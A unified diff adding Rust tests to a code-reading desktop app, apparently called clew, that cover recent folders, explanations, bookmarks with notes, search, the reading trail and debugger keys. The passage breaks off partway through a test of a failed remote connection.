@@ -10,15 +10,20 @@ mod askfloat;
 #[cfg(unix)]
 mod build_app;
 mod embedding;
+mod fakerun;
+mod graph_search;
 mod insight;
 mod integrations;
 mod navigation_debug;
 mod palette;
+mod proof;
 mod remote_state_refresh;
 mod semantic_space;
 mod setup;
 mod speech;
+mod tour;
 mod voice;
+mod weakspots;
 mod windowtools;
 
 #[tokio::test(flavor = "multi_thread")]
@@ -507,9 +512,6 @@ fn writes_clipboard(task: Task<Message>) -> bool {
         .any(|action| matches!(action, iced_test::runtime::Action::Clipboard(_)))
 }
 
-/// Complete the project-state load the way its blocking job would — the same
-/// `LoadedProjectState::read` — so a test sees the stored trail, bookmarks,
-/// notes and caches as soon as the project is open.
 /// The user's choices for the open project's languages, read as the open's
 /// task would and handed in at once — which language servers wait for.
 fn load_choices_synchronously(app: &mut App) {
@@ -525,6 +527,9 @@ fn load_choices_synchronously(app: &mut App) {
     }
 }
 
+/// Complete the project-state load the way its blocking job would — the same
+/// `LoadedProjectState::read` — so a test sees the stored trail, bookmarks,
+/// notes and caches as soon as the project is open.
 fn load_state_synchronously(app: &mut App) {
     let Some(root) = app.proj.project.as_ref().map(|p| p.root.clone()) else {
         return;
@@ -963,6 +968,46 @@ fn a_loading_line_said_before_a_language_switch_is_still_taken_back() {
     );
 }
 
+/// M16: a notice said before the language changed goes with it — "调试器已停止"
+/// stood on an English screen until something else was said. What tells
+/// of work under way stays, to be taken back by its end.
+#[test]
+fn a_notice_said_before_a_language_switch_goes_with_it() {
+    use crate::i18n::{Lang, with_lang};
+    let mut app = blank_app();
+    with_lang(Lang::Zh, || {
+        app.status = tr!("Debugger stopped").to_string();
+        app.note_status();
+    });
+    let said = app.status.clone();
+    // Said again in the language it was said in: it stays.
+    with_lang(Lang::Zh, || {
+        let _ = app.update(Message::Settings(SettingsMsg::ThemeResynced));
+    });
+    assert_eq!(app.status, said, "the language did not change");
+    let _ = app.update(Message::Settings(SettingsMsg::ThemeResynced));
+    assert_eq!(app.status, "", "{said}: still up in English");
+    // R16-9b: the language chosen in this window, not only one followed
+    // from another: the line goes too.
+    with_lang(Lang::Zh, || {
+        app.status = tr!("Debugger stopped").to_string();
+        app.note_status();
+    });
+    let _ = app.update(Message::Settings(SettingsMsg::SetLanguage(
+        crate::i18n::LangPref::Chosen(Lang::En),
+    )));
+    assert_eq!(app.status, "", "still up after choosing English");
+
+    // Work under way stays.
+    with_lang(Lang::Fr, || {
+        app.status = tr!("Loading history…").to_string();
+        app.note_status();
+    });
+    let loading = app.status.clone();
+    let _ = app.update(Message::Settings(SettingsMsg::ThemeResynced));
+    assert_eq!(app.status, loading);
+}
+
 /// The lines a close or a quit says as it waits for the host are known by
 /// the words they were said in: one said before the language changed is
 /// still counted down, and taken back as the wait ends; a "— retrying"
@@ -982,6 +1027,7 @@ fn a_waiting_line_said_before_a_language_switch_is_still_known() {
     assert_eq!(app.status, "", "{french}: still up as the wait ended");
 
     let tour = walkthrough::Walkthrough {
+        made: None,
         title: "tour".into(),
         scope: "how it starts".into(),
         steps: Vec::new(),
@@ -1059,11 +1105,141 @@ fn scan_synchronously(app: &mut App, root: PathBuf) {
     load_state_synchronously(app);
 }
 
+/// M7: reopened, a project goes back to the file and line its reading
+/// trail stands on — every session started on the overview, then "No file
+/// open". Only for a file still in the project: else the overview, as
+/// before.
+#[test]
+fn a_reopened_project_goes_back_where_it_was_read() {
+    use crate::history::{History, Loc};
+    let trail_at = |root: &std::path::Path, rel: &str| {
+        let mut trail = History::default();
+        trail.push(
+            Loc {
+                path: root.join(rel),
+                line: Some(3),
+            },
+            Some("origin".into()),
+        );
+        let text = crate::history::to_text(root, &trail).unwrap();
+        crate::history::save_text(root, Some(&text)).unwrap();
+    };
+    let root = fixture_project("back-where-read");
+    trail_at(&root, "src/lib.rs");
+    let mut app = blank_app();
+    scan_synchronously(&mut app, root.clone());
+    assert!(!app.proj.overview.showing, "still on the overview");
+    assert!(
+        app.proj.link.pane_pending[0].is_some(),
+        "the file not asked for"
+    );
+    land_active_load(&mut app, root.join("src/lib.rs"), Some(3));
+    let v = app.active_viewer().expect("the file read last");
+    assert_eq!(v.rel, "src/lib.rs");
+    assert_eq!(
+        app.proj.history.flatten().len(),
+        1,
+        "going back is no new visit"
+    );
+
+    // Its file gone since: the overview.
+    let root = fixture_project("back-where-read-gone");
+    trail_at(&root, "src/gone.rs");
+    let mut app = blank_app();
+    scan_synchronously(&mut app, root);
+    assert!(app.proj.overview.showing);
+    assert!(app.active_viewer().is_none());
+    assert!(app.proj.link.pane_pending[0].is_none());
+
+    // R16-8: the tour's sample, opened for a tour, is set out by the
+    // tour: no file opened as it begins.
+    let root = fixture_project("back-where-read-sample");
+    trail_at(&root, "src/lib.rs");
+    let mut app = blank_app();
+    app.tour_sample = Some(crate::app::tour_sample::Placed {
+        root: root.clone(),
+        history: false,
+    });
+    scan_synchronously(&mut app, root);
+    assert!(app.proj.overview.showing);
+    assert!(
+        app.proj.link.pane_pending[0].is_none(),
+        "opened under the tour"
+    );
+
+    // M3: a folder with no code opens on no overview of it: it offered an
+    // Explain All with nothing to explain.
+    let root = fixture_project("back-where-read-no-code");
+    std::fs::remove_file(root.join("src/lib.rs")).unwrap();
+    let mut app = blank_app();
+    scan_synchronously(&mut app, root);
+    assert!(app.proj.code_languages.is_empty());
+    assert!(!app.proj.overview.showing, "an overview of no code");
+    assert!(app.no_code());
+    // Nor anything to run: it was told to write a launch file.
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    assert_eq!(app.status, "There is nothing to run in this folder.");
+    // Shell scripts are code, though no server is set up for them: the
+    // overview is of them.
+    let root = fixture_project("back-where-read-scripts");
+    std::fs::remove_file(root.join("src/lib.rs")).unwrap();
+    std::fs::write(root.join("deploy.sh"), "echo deploying\n").unwrap();
+    let mut app = blank_app();
+    scan_synchronously(&mut app, root);
+    assert!(
+        app.proj.overview.showing,
+        "no overview of a folder of scripts"
+    );
+    assert!(!app.no_code());
+}
+
 fn scanned_app(tag: &str) -> App {
     let root = fixture_project(tag);
     let mut app = blank_app();
     scan_synchronously(&mut app, root);
     app
+}
+
+/// A folder opened on this machine is offered again on the welcome screen:
+/// first, once, and kept for the next run of clew — read again as a window
+/// opens, after any opened meanwhile. One asked for from the list and gone
+/// since is no longer offered.
+#[test]
+fn an_opened_folder_is_remembered_for_the_welcome_screen() {
+    let data = clew_core::testutil::TempDir::new("recent-store");
+    let store = data.path().join("recent.json");
+    let root = fixture_project("recent-remembered");
+    let mut app = blank_app();
+    app.recent_store = Some(store.clone());
+    scan_synchronously(&mut app, root.clone());
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    assert_eq!(app.recent_folders.first(), Some(&root));
+    assert_eq!(
+        crate::app::recent::load_from(&store),
+        vec![root.clone()],
+        "kept for the next run"
+    );
+    // The next window: what was read comes after what was opened meanwhile.
+    let mut next = blank_app();
+    let other = data.path().join("other");
+    std::fs::create_dir_all(&other).unwrap();
+    next.recent_folders = vec![other.clone()];
+    let _ = next.update(Message::Project(ProjectMsg::RecentRead(vec![
+        root.clone(),
+        other.clone(),
+    ])));
+    assert_eq!(next.recent_folders, vec![other.clone(), root.clone()]);
+    // Gone since: asked for, it is said not there, and no longer offered.
+    next.recent_store = Some(store.clone());
+    crate::app::recent::remember_in(&store, &other);
+    std::fs::remove_dir(&other).unwrap();
+    let _ = next.update(Message::Project(ProjectMsg::FolderPicked(Some(
+        other.clone(),
+    ))));
+    assert!(next.status.contains("No folder"), "{}", next.status);
+    assert_eq!(next.recent_folders, vec![root.clone()]);
+    let text = std::fs::read_to_string(&store).unwrap();
+    assert!(!text.contains("other"), "{text}");
 }
 
 /// Build the message the off-thread rehash sends back for `events`: stamped
@@ -1435,6 +1611,99 @@ fn reexplain_on_unexplained_node_does_not_start_a_project_pass() {
         "status: {}",
         app.status
     );
+}
+
+/// The file's Explain writes the explanation a file does not have yet —
+/// it alone, as a re-explain does, never the whole project — and shows it;
+/// it only showed one, and for a file not yet explained did nothing.
+#[test]
+fn the_files_explain_writes_its_missing_explanation() {
+    let mut app = scanned_app("explain-file-button");
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    let file = explain::Node::File(app.proj.project.as_ref().unwrap().root.join("src/lib.rs"));
+    assert!(app.proj.explain.cache.is_empty());
+    let _ = app.update(Message::Explain(ExplainMsg::Explain(file.clone())));
+    assert!(app.proj.explain.running, "it is being explained");
+    assert_eq!(
+        app.proj.explain.pass_target.as_ref(),
+        Some(&file),
+        "it alone"
+    );
+    assert!(app.proj.explain.pass_target_new);
+    assert_eq!(app.proj.explain.view.as_ref(), Some(&file), "and shown");
+    // Said by its chip, by name — not again on the status line beside it.
+    assert_ne!(app.status, "Explaining…");
+    let chip = crate::ui::explain_label_for_tests(&app);
+    assert!(
+        chip.as_ref()
+            .is_some_and(|(label, _)| label.starts_with("Explaining lib.rs")),
+        "{chip:?}"
+    );
+
+    // Shown again while that pass runs: no second pass.
+    let generation = app.proj.explain.generation;
+    let _ = app.update(Message::Explain(ExplainMsg::Explain(file.clone())));
+    assert_eq!(app.proj.explain.generation, generation);
+}
+
+/// A function's Explain — its context menu — writes the function's own
+/// explanation, it alone, as the file's Explain writes the file's. It wrote
+/// the block walkthrough, which the card showed under the function's name as
+/// its explanation, three lines of it cut off. With no model to write it,
+/// Settings opens where one is added; it said so and opened nothing.
+#[test]
+fn a_functions_explain_writes_its_own_explanation() {
+    let mut app = scanned_app("explain-fn-menu");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let menu_on = |app: &mut App, line: usize| {
+        app.proj.context_menu = Some(crate::ContextMenu {
+            pane: app.proj.active,
+            line,
+            col: 4,
+            x: 0.0,
+            y: 0.0,
+            insight: None,
+            served: true,
+            by_pointer: true,
+            line_top: None,
+        });
+    };
+    let origin = explain::Node::Function {
+        file: app.proj.project.as_ref().unwrap().root.join("src/lib.rs"),
+        name: "origin".into(),
+        ordinal: 0,
+    };
+    // No model: Settings, at the page where one is added.
+    app.llm_config_cache = Some(None);
+    menu_on(&mut app, 2); // `pub fn origin() -> Point {`
+    let opened = run_task(app.update(Message::Explain(ExplainMsg::FromMenu)));
+    assert!(
+        opened
+            .iter()
+            .any(|m| matches!(m, Message::Settings(SettingsMsg::NeedKey))),
+        "{opened:?}"
+    );
+    assert!(!app.proj.explain.running);
+    assert_eq!(app.proj.explain.view.as_ref(), Some(&origin), "still shown");
+
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    menu_on(&mut app, 2);
+    let _ = app.update(Message::Explain(ExplainMsg::FromMenu));
+    assert!(app.proj.context_menu.is_none(), "the menu goes");
+    assert!(app.proj.explain.running, "it is being explained");
+    assert_eq!(
+        app.proj.explain.pass_target.as_ref(),
+        Some(&origin),
+        "it alone"
+    );
+    assert!(
+        app.proj.explain.blocks_in_flight.is_empty(),
+        "not its walkthrough"
+    );
+    assert!(!app.proj.explain.showing_detail);
+    assert!(app.show_right_panel, "where it is shown");
 }
 
 #[test]
@@ -2974,6 +3243,95 @@ fn bookmark_toggle_persists_in_project() {
     assert!(!root.join(".clew/bookmarks.json").exists());
 }
 
+/// The code's context menu puts a bookmark on the line it was opened on —
+/// not the caret's — and writes a note for one: the bookmark is put on as
+/// the note is saved, and a note cancelled leaves none. There was no way
+/// to bookmark from it, nor to write a note but from the Bookmarks list.
+#[test]
+fn the_context_menu_bookmarks_its_line_with_a_note() {
+    let mut app = scanned_app("bookmark-menu");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    open_synchronously(&mut app, "src/lib.rs", Some(1));
+    let menu_on = |app: &mut App, line: usize| {
+        app.proj.context_menu = Some(crate::ContextMenu {
+            pane: app.proj.active,
+            line,
+            col: 0,
+            x: 0.0,
+            y: 0.0,
+            insight: None,
+            served: true,
+            by_pointer: true,
+            line_top: None,
+        });
+    };
+    // Toggle Bookmark: on the menu's line (0-based 3: line 4), the caret
+    // on line 1.
+    menu_on(&mut app, 3);
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkFromMenu {
+        note: false,
+    }));
+    assert_eq!(app.proj.bookmarks.len(), 1);
+    assert_eq!(app.proj.bookmarks[0].line, 4);
+    assert!(app.proj.context_menu.is_none(), "the menu goes");
+
+    // Bookmark with Note…, cancelled: nothing put on.
+    menu_on(&mut app, 5);
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkFromMenu {
+        note: true,
+    }));
+    assert_eq!(
+        app.proj
+            .note_edit
+            .as_ref()
+            .map(|(r, l, _)| (r.as_str(), *l)),
+        Some(("src/lib.rs", 6))
+    );
+    assert_eq!(app.proj.bookmarks.len(), 1, "not until it is saved");
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkNoteCancel));
+    assert_eq!(app.proj.bookmarks.len(), 1);
+
+    // Saved: the bookmark, with its note, on disk too.
+    menu_on(&mut app, 5);
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkFromMenu {
+        note: true,
+    }));
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkNoteInput(
+        "why it is here".into(),
+    )));
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkNoteSave));
+    let six = app
+        .proj
+        .bookmarks
+        .iter()
+        .find(|b| b.line == 6)
+        .expect("put on");
+    assert_eq!(six.note.as_deref(), Some("why it is here"));
+    assert_eq!(bookmarks::load(&root), app.proj.bookmarks);
+
+    // A note for a line that cannot be bookmarked now — its file no longer
+    // open — stays in its editor: it was attached to nothing, the editor
+    // closed, and the text lost.
+    app.proj.note_edit = Some(("src/other.rs".into(), 2, "kept".into()));
+    let _ = app.update(Message::Reading(ReadingMsg::BookmarkNoteSave));
+    assert_eq!(
+        app.proj.note_edit.as_ref().map(|(_, _, t)| t.as_str()),
+        Some("kept")
+    );
+    assert!(app.status.contains("Open the file"), "{}", app.status);
+    app.proj.note_edit = None;
+
+    // On a bookmarked line, the menu says it edits the note.
+    menu_on(&mut app, 5);
+    let menu = app.proj.context_menu.unwrap();
+    let (targets, _) = crate::ui::heard::gather_all_of(|| crate::ui::context_menu(&app, &menu));
+    assert!(
+        targets.iter().any(|t| t.shown == "Edit Bookmark Note…"),
+        "{:?}",
+        targets.iter().map(|t| &t.shown).collect::<Vec<_>>()
+    );
+}
+
 #[test]
 fn consent_gates_project_open() {
     let data = test_dir("consent-data");
@@ -3108,6 +3466,108 @@ fn auto_refresh_throttles_but_manual_does_not() {
     assert!(!app.proj.refresh_pending, "the queued change rides along");
 }
 
+/// Switched off (Settings → Usage and cost), a change to the code spends
+/// nothing by itself: no pass starts, none is queued, and turning it back on
+/// refreshes what changed meanwhile.
+#[test]
+fn explanations_kept_fresh_only_when_switched_on() {
+    let mut app = blank_app();
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    app.proj.explain.cache.insert(
+        explain::Node::File(PathBuf::from("a.rs")),
+        explain::Cached {
+            summary: "s".into(),
+            prompt_hash: 1,
+            detail: None,
+            basis: None,
+        },
+    );
+    assert!(app.keep_explanations_fresh, "on by default, as it was");
+    let _ = app.update(Message::Usage(UsageMsg::KeepFresh(false)));
+    assert!(!app.keep_explanations_fresh);
+    app.proj
+        .explain
+        .changed_sources
+        .insert(PathBuf::from("a.rs"));
+    assert!(
+        run_task(app.request_auto_refresh()).is_empty(),
+        "switched off, a change must start no pass"
+    );
+    assert!(
+        app.proj.last_auto_refresh.is_none() && !app.proj.refresh_pending,
+        "switched off, nothing is queued for later either"
+    );
+    assert!(
+        !app.proj.explain.changed_sources.is_empty(),
+        "what changed is kept for the pass the reader asks for"
+    );
+    let started = run_task(app.update(Message::Usage(UsageMsg::KeepFresh(true))));
+    assert!(
+        started
+            .iter()
+            .any(|m| matches!(m, Message::Explain(ExplainMsg::Refresh))),
+        "switched back on, what changed meanwhile is refreshed: {started:?}"
+    );
+}
+
+/// Switched off, a refresh queued before (a change during the cooldown)
+/// does not fire on a later tick, and an automatic pass under way is
+/// stopped: nothing more is spent by itself.
+#[test]
+fn a_queued_refresh_does_not_fire_once_switched_off() {
+    use std::time::{Duration, Instant};
+    let mut app = blank_app();
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    app.proj.explain.cache.insert(
+        explain::Node::File(PathBuf::from("a.rs")),
+        explain::Cached {
+            summary: "s".into(),
+            prompt_hash: 1,
+            detail: None,
+            basis: None,
+        },
+    );
+    app.proj.last_auto_refresh = Some(Instant::now());
+    app.proj
+        .explain
+        .changed_sources
+        .insert(PathBuf::from("a.rs"));
+    let _ = app.request_auto_refresh();
+    assert!(app.proj.refresh_pending, "queued inside the cooldown");
+    let _ = app.update(Message::Usage(UsageMsg::KeepFresh(false)));
+    assert!(!app.proj.refresh_pending);
+    app.proj.last_auto_refresh = Some(Instant::now() - Duration::from_secs(31));
+    // Queued again by some other path: the tick still holds it.
+    app.proj.refresh_pending = true;
+    let fired = run_task(app.on_tick());
+    assert!(
+        !fired
+            .iter()
+            .any(|m| matches!(m, Message::Explain(ExplainMsg::Refresh))),
+        "switched off, a queued refresh still ran: {fired:?}"
+    );
+    // An automatic pass under way is stopped as the switch goes off, its
+    // files left as changed.
+    let _ = app.update(Message::Usage(UsageMsg::KeepFresh(true)));
+    app.proj.explain.running = true;
+    app.proj.explain.pass_automatic = true;
+    app.proj.explain.pass_sources = [PathBuf::from("b.rs")].into_iter().collect();
+    let _ = app.update(Message::Usage(UsageMsg::KeepFresh(false)));
+    assert!(!app.proj.explain.running, "the automatic pass goes on");
+    assert!(
+        app.proj
+            .explain
+            .changed_sources
+            .contains(&PathBuf::from("b.rs"))
+    );
+    // Switched on with nothing changed, nothing starts.
+    app.proj.explain.changed_sources.clear();
+    app.proj.last_auto_refresh = None;
+    assert!(run_task(app.update(Message::Usage(UsageMsg::KeepFresh(true)))).is_empty());
+}
+
 #[test]
 fn search_flow_message_wiring() {
     let mut app = scanned_app("search");
@@ -3116,6 +3576,8 @@ fn search_flow_message_wiring() {
         let project = app.proj.project.as_ref().unwrap();
         (project.root.clone(), project.files.clone())
     };
+    // The match along its line, not at its start.
+    std::fs::write(root.join("notes.txt"), "the needle in notes\n").unwrap();
     let result = search::search_in(
         &root,
         files,
@@ -3137,14 +3599,24 @@ fn search_flow_message_wiring() {
     assert_eq!(app.proj.search.hits.len(), 1);
     assert_eq!(app.proj.search.hits[0].rel, "notes.txt");
 
-    // Clicking a hit opens the file at that line.
+    // Clicking a hit opens the file at that line, on what matched: it
+    // opened at the line's start, and the match was to be found again.
+    app.proj.search.matcher = search::PreviewMatcher::of_search(&search::SearchOptions {
+        query: "needle".to_string(),
+        ..Default::default()
+    });
     let hit = app.proj.search.hits[0].clone();
-    let _ = app.update(Message::Editor(EditorMsg::OpenAbs {
+    let _ = app.update(Message::Editor(EditorMsg::OpenHit {
         abs: hit.abs.clone(),
-        line: Some(hit.line),
-        push: true,
+        line: hit.line,
+        at: None,
     }));
     let content = read_text_file(&hit.abs).unwrap();
+    let at = content
+        .lines()
+        .nth(hit.line - 1)
+        .and_then(|l| l.find("needle"))
+        .expect("the hit's line has the needle");
     let req = app.proj.link.pane_pending[0].expect("open_file minted a load token");
     let _ = app.update(Message::Editor(EditorMsg::FileLoaded {
         stamp: app.stamp(),
@@ -3155,6 +3627,75 @@ fn search_flow_message_wiring() {
         result: Ok(content),
     }));
     assert_eq!(app.active_viewer().unwrap().target_line, Some(1));
+    assert_eq!(
+        app.active_viewer().unwrap().caret,
+        Some((hit.line - 1, at)),
+        "the caret is on the match"
+    );
+}
+
+/// The Reading trail opens on the place being read: it opened at the
+/// oldest stop, the current one off its foot.
+#[test]
+fn the_reading_trail_opens_on_the_current_stop() {
+    let mut app = blank_app();
+    assert_eq!(
+        app.update(Message::Window(WindowMsg::SidebarTabPicked(
+            SidebarTab::Trail
+        )))
+        .units(),
+        0,
+        "nothing to scroll to"
+    );
+    for i in 0..30 {
+        app.proj.history.push(
+            crate::history::Loc {
+                path: PathBuf::from(format!("/p/f{i}.rs")),
+                line: Some(1),
+            },
+            None,
+        );
+    }
+    assert_eq!(
+        app.update(Message::Window(WindowMsg::SidebarTabPicked(
+            SidebarTab::Trail
+        )))
+        .units(),
+        1,
+        "the list is not brought to the current stop"
+    );
+    // The newest of thirty is the list's foot; one back, a share above it.
+    let offset = |app: &App| {
+        crate::app::runtime::trail_offset(
+            &app.proj.history.flatten_with(&app.proj.trail_collapsed),
+            &app.proj.history.current_path(),
+        )
+    };
+    assert_eq!(offset(&app), Some(1.0));
+    let _ = app.proj.history.back();
+    assert_eq!(offset(&app), Some(28.0 / 29.0));
+    // Inside a folded branch, the fold that holds it.
+    let path = app.proj.history.current_path();
+    let fold = path[5];
+    app.proj.trail_collapsed.insert(fold);
+    let visits = app.proj.history.flatten_with(&app.proj.trail_collapsed);
+    let at = visits.iter().position(|v| v.id == fold).unwrap();
+    assert_eq!(
+        offset(&app),
+        Some(at as f32 / (visits.len() - 1).max(1) as f32)
+    );
+    assert!(at < 29, "the fold hides the current stop");
+}
+
+/// A module opened from a map leaves the sidebar as the reader had it: it
+/// swapped their Files for the Imports view.
+#[test]
+fn opening_a_module_from_a_map_keeps_the_sidebar() {
+    let mut app = scanned_app("map-open");
+    app.sidebar = SidebarTab::Files;
+    let abs = app.proj.project.as_ref().unwrap().root.join("src/lib.rs");
+    let _ = app.update(Message::Graph(GraphMsg::OverlayOpenImports(abs)));
+    assert_eq!(app.sidebar, SidebarTab::Files);
 }
 
 #[test]
@@ -4401,7 +4942,7 @@ fn an_allow_counts_once_its_question_has_been_within_reach_for_the_delay() {
     // Under the tour, then in a window without the focus: out of reach.
     for (hide, show) in [
         (
-            Message::Tutorial(TutorialMsg::Start),
+            Message::Tutorial(TutorialMsg::Begin),
             Message::Tutorial(TutorialMsg::Exit),
         ),
         (
@@ -5323,13 +5864,22 @@ async fn a_stale_call_tree_is_traced_again_from_its_own_function() {
         direction: callgraph::Direction::Outgoing,
         lang: "rust",
         items: vec![origin],
+        again: None,
     }));
     app.proj.call_graph.as_mut().unwrap().stale = true;
+    app.proj.call_graph.as_mut().unwrap().full = true;
+    // Two lines written above it since: it is asked about where it is now.
+    std::fs::write(
+        root.join("src/lib.rs"),
+        "pub fn a() {}\n\n\n\n\n\n\n// moved\n// down\npub fn origin() {}\n",
+    )
+    .unwrap();
 
     let refresh = app.update(Message::Calls(CallsMsg::Refresh));
     let landed = run_task_async(refresh).await;
+    assert_eq!(server.prepared(7), 0, "asked where it was");
     assert_eq!(
-        server.prepared(7),
+        server.prepared(9),
         1,
         "the tree's own function was not asked"
     );
@@ -5339,11 +5889,48 @@ async fn a_stale_call_tree_is_traced_again_from_its_own_function() {
             [Message::Calls(CallsMsg::Prepared {
                 direction: callgraph::Direction::Outgoing,
                 lang: "rust",
+                again: Some(true),
                 ..
             })]
         ),
         "{landed:?}"
     );
+    // Landed, the tree that replaces it is expanded in full as it was; a
+    // trace that finds nothing leaves it, said so.
+    let token = app.proj.call_pending.expect("a trace awaited");
+    let _ = app.update(Message::Calls(CallsMsg::Prepared {
+        stamp: app.stamp(),
+        token,
+        direction: callgraph::Direction::Outgoing,
+        lang: "rust",
+        items: Vec::new(),
+        again: Some(true),
+    }));
+    assert_eq!(app.status, "Could not trace origin again");
+    assert!(app.proj.call_graph.is_some());
+    app.proj.call_pending = Some(token);
+    let _ = app.update(Message::Calls(CallsMsg::Prepared {
+        stamp: app.stamp(),
+        token,
+        direction: callgraph::Direction::Outgoing,
+        lang: "rust",
+        items: vec![lsp::client::CallItem {
+            name: "origin".into(),
+            detail: String::new(),
+            kind: 12,
+            path: root.join("src/lib.rs"),
+            line: 9,
+            character: 7,
+            raw: serde_json::json!({}),
+        }],
+        again: Some(true),
+    }));
+    assert!(app.proj.call_graph.as_ref().unwrap().full);
+    // Gone from the file: said so, and not asked about.
+    std::fs::write(root.join("src/lib.rs"), "pub fn a() {}\n").unwrap();
+    let refresh = app.update(Message::Calls(CallsMsg::Refresh));
+    assert!(run_task_async(refresh).await.is_empty());
+    assert_eq!(app.status, "origin is no longer in lib.rs");
     // With no tree, there is nothing to trace again.
     app.proj.call_graph = None;
     let refresh = app.update(Message::Calls(CallsMsg::Refresh));
@@ -5376,6 +5963,7 @@ fn stale_call_children_do_not_graft_onto_new_tree() {
         direction: callgraph::Direction::Incoming,
         lang: "rust",
         items: vec![item("root")],
+        again: None,
     }));
     assert_eq!(app.proj.call_graph.as_ref().unwrap().token, old_token);
 
@@ -5482,6 +6070,78 @@ fn debug_runs_the_open_script_without_a_config_and_hides_telemetry() {
     assert!(!shown.contains("ptvsd"), "{shown:?}");
 }
 
+/// The debugger's function keys, as editors have them: F9 a breakpoint on
+/// the caret's line; F5 starts debugging when nothing runs, continues a
+/// paused program; F10, F11 and ⇧F11 step a paused one; ⇧F5 stops it. A
+/// running program takes no step; Ctrl/Cmd with them is not theirs.
+#[test]
+fn the_debugger_has_its_function_keys() {
+    use iced::keyboard::{Key, Modifiers, key::Named};
+    let mut app = scanned_app("debug-fkeys");
+    open_synchronously(&mut app, "src/lib.rs", Some(3));
+    let f = |n: Named| Key::Named(n);
+    let abs = app.active_viewer().unwrap().abs.clone();
+    app.proj.panes[0].as_mut().unwrap().caret = Some((2, 0));
+    assert!(matches!(
+        app.debug_key(&f(Named::F9), Modifiers::empty()),
+        Some(Message::Debug(DebugMsg::BreakpointToggle { path, line: 3 })) if path == abs
+    ));
+    assert!(matches!(
+        app.debug_key(&f(Named::F5), Modifiers::empty()),
+        Some(Message::Editor(EditorMsg::RunAction(
+            crate::keymap::Action::StartDebug
+        )))
+    ));
+    assert!(app.debug_key(&f(Named::F10), Modifiers::empty()).is_none());
+    let session = |status| DebugSession {
+        client: None,
+        status,
+        exit_code: None,
+        thread_id: Some(1),
+        frames: Vec::new(),
+        scopes: Vec::new(),
+        watches: Vec::new(),
+        output: Vec::new(),
+        current: None,
+        program: PathBuf::from("/bin/true"),
+        args: Vec::new(),
+        cwd: PathBuf::from("/"),
+        addr: None,
+    };
+    app.debug.session = Some(session(DebugStatus::Stopped));
+    let step = |app: &App, n: Named, m: Modifiers| match app.debug_key(&f(n), m) {
+        Some(Message::Debug(DebugMsg::Control(cmd))) => Some(cmd),
+        _ => None,
+    };
+    assert_eq!(
+        step(&app, Named::F5, Modifiers::empty()),
+        Some(DebugCmd::Continue)
+    );
+    assert_eq!(
+        step(&app, Named::F10, Modifiers::empty()),
+        Some(DebugCmd::StepOver)
+    );
+    assert_eq!(
+        step(&app, Named::F11, Modifiers::empty()),
+        Some(DebugCmd::StepIn)
+    );
+    assert_eq!(
+        step(&app, Named::F11, Modifiers::SHIFT),
+        Some(DebugCmd::StepOut)
+    );
+    assert!(matches!(
+        app.debug_key(&f(Named::F5), Modifiers::SHIFT),
+        Some(Message::Debug(DebugMsg::Stop))
+    ));
+    assert!(app.debug_key(&f(Named::F10), Modifiers::CTRL).is_none());
+    app.debug.session = Some(session(DebugStatus::Running));
+    assert!(
+        step(&app, Named::F10, Modifiers::empty()).is_none(),
+        "running"
+    );
+    assert!(app.debug_key(&f(Named::F5), Modifiers::empty()).is_none());
+}
+
 /// A variable with children opens in the panel (it could not: debugpy's
 /// globals sat behind three value-less "… variables =" rows): its children
 /// are kept for the stop they were read at, and a reply for a stop already
@@ -5492,6 +6152,7 @@ fn debug_variables_open_into_their_children_for_the_stop() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Stopped,
+        exit_code: None,
         thread_id: Some(1),
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -5550,6 +6211,7 @@ fn a_finished_run_is_no_longer_said_to_be_running() {
     let session = || DebugSession {
         client: None,
         status: DebugStatus::Running,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -5585,7 +6247,7 @@ fn a_finished_run_is_no_longer_said_to_be_running() {
 
     // Stopped, then running again.
     app.debug.session = Some(session());
-    app.say_debug_state(tr!("Stopped: {reason}", reason = "breakpoint"));
+    app.say_debug_state(tr!("Paused: {reason}", reason = "breakpoint"));
     event(
         &mut app,
         dap::DapEvent::Continued {
@@ -5593,7 +6255,18 @@ fn a_finished_run_is_no_longer_said_to_be_running() {
             all_threads: true,
         },
     );
-    assert_eq!(app.status, tr!("Debugger running…"));
+    // Running again, and which program: Run's pick was said nowhere.
+    let name = app
+        .debug
+        .session
+        .as_ref()
+        .unwrap()
+        .program
+        .file_name()
+        .unwrap()
+        .to_string_lossy()
+        .into_owned();
+    assert_eq!(app.status, tr!("Debugging {file}…", file = name));
 }
 
 /// A late event from a stopped debug run must not land on the next session.
@@ -5603,6 +6276,7 @@ fn stale_debug_events_are_dropped() {
     let session = || DebugSession {
         client: None,
         status: DebugStatus::Running,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -6063,25 +6737,26 @@ fn connect_bootstrap_failure_clears_the_scanning_placeholder() {
     );
 }
 
-/// A connect that fails from the modal leaves the window saying so — the
-/// welcome read "Connected to …" over a host never reached — and
-/// "Disconnect and read local code" goes back to the local project the window
-/// left for it, not to an empty window. Once the local server is up, its
-/// "Connecting to Local…" headline goes too.
+/// A connect from the Connect form that never comes up — here, no ssh —
+/// leaves the reader where they were: back on this machine, the project
+/// they left open again at the file and line they were reading, and the
+/// form saying why, to try again from. The host is not saved: it never
+/// answered — a typo was listed for good.
 #[test]
-fn a_failed_connect_says_so_and_disconnect_reads_the_local_project_again() {
+fn a_failed_connect_goes_back_to_where_the_reader_was() {
     let mut app = scanned_app("connect-failed-back-local");
     let root = app.proj.project.as_ref().unwrap().root.clone();
-    let host = crate::connect::SavedConnection {
-        name: String::new(),
+    open_synchronously(&mut app, "src/lib.rs", Some(3));
